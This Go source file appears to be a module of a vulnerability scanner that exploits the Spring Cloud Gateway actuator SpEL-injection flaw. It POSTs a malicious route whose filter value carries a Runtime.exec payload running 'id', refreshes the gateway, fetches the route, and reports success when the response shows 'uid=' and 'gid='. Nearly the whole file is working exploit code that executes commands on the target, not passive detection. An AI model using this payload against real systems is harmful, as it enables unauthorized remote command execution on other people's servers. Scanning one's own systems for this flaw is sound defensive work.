package Other

import (
	"io"
	"io/ioutil"
	"net/http"
	"net/http/httputil"
	"strings"
)

func RequestHead(url string, ch chan interface{}) {
	Head := map[string]string{"Content-Type": "application/json"}
	resp, _, resqbody := Request("POST", url+"/actuator/gateway/routes/hacktest", strings.NewReader("{  \"id\": \"hacktest\",  \"filters\": [{    \"name\": \"AddResponseHeader\",    \"args\": {      \"name\": \"Result\",      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}\"    }  }],  \"uri\": \"http://example.com\"}"), Head)
	if resp != nil && resp.StatusCode == 201 {
		_, _, resqbody1 := Request("POST", url+"/actuator/gateway/refresh", nil, nil)
		_, body2, resqbody2 := Request("GET", url+"/actuator/gateway/routes/hacktest", nil, nil)
		if strings.Contains(string(body2), "uid=") && strings.Contains(string(body2), "gid=") {
			ch <- "Step1:+\n" + string(resqbody) + "\nStep2:+\n" + string(resqbody1) + "\nStep3:+\n" + string(resqbody2) + "id执行结果：\n" + string(body2)
			Wg.Add(1)
		}

	} else {
		return
	}

}
func Request(Main string, url string, bodys io.Reader, head map[string]string) (*http.Response, string, string) {
	resq, err := http.NewRequest(Main, url, bodys)
	if err != nil {
		//DATADefiny.ErrorCheck(url, err)
		return nil, "", ""
	}
	for key, val := range head {
		resq.Header.Add(key, val)
	}
	resqbody, err := httputil.DumpRequest(resq, true)
	if err != nil {
		//DATADefiny.ErrorCheck(url, err)
		return nil, "", ""

	}
	client := http.Client{}
	resp, err := client.Do(resq) //排除全局变量引起的问题，排除resq为空引发的问题,排除因err定义的问题
	if err != nil {
		return nil, "", ""
	}
	body, err := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	if err != nil {
		return nil, "", ""
	}
	return resp, string(body), string(resqbody)
}
